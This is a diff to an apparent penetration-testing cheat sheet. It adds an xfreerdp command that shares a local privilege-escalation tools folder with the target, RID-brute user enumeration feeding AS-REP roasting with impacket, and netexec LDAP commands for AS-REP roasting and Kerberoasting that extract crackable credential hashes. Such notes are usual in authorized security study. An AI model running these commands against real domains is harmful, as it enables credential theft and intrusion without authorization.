@@ -434,6 +434,8 @@ git show <commit-id>
 xfreerdp /u:uname /p:'pass' /v:IP
 xfreerdp /d:domain.com /u:uname /p:'pass' /v:IP
 xfreerdp /u:uname /p:'pass' /v:IP +clipboard #try this option if normal login doesn't work
+xfreerdp3 /v:10.10.166.204 /u:'User' /p:'Pass' /cert:ignore +clipboard /dynamic-resolution /drive:/opt/tools/privesc/,share
+Get-ChildItem \\tsclient\share
 ```
 
 ## Adding SSH Public key
@@ -819,8 +821,17 @@ nxc smb $DC -u 'user' -p 'password' -d $DOMAIN -k # Kerberos auth
 klist # View cached Kerberos tickets
 # Kerberos flow: credentials/ticket → KDC/DC → Kerberos ticket → target service
 # Kerberos troubleshooting: port 88 → domain → DC hostname/DNS → time sync → credentials/ticket
+
 #Enumerate RIDs with credentials
 nxc smb $IP -u '' -p '' --rid-brute
+nxc smb $IP -u 'guest' -p '' --rid-brute | grep 'SidTypeUser' | awk '{print $6}' | cut -d'\' -f2 | tee users.txt
+impacket-GetNPUsers -dc-ip <DC-IP> -usersfile users.txt -no-pass '<domain>/'
+
+#Netexec over LDAP
+nxc ldap <DC-IP> -u 'user' -p 'password' -d 'corp.local' --users
+nxc ldap <DC-IP> -u 'user' -p 'password' -d 'corp.local' --groups
+nxc ldap <DC-IP> -u 'user' -p 'password' -d 'corp.local' --asreproast asrep.txt # Find accounts with Kerberos pre-authentication disabled
+nxc ldap <DC-IP> -u 'user' -p 'password' -d 'corp.local' --kerberoasting kerberoast.txt # Find Kerberoastable accounts / request hashes
 
 # Smbclient
 smbclient -L //IP #or try with 4 /'s
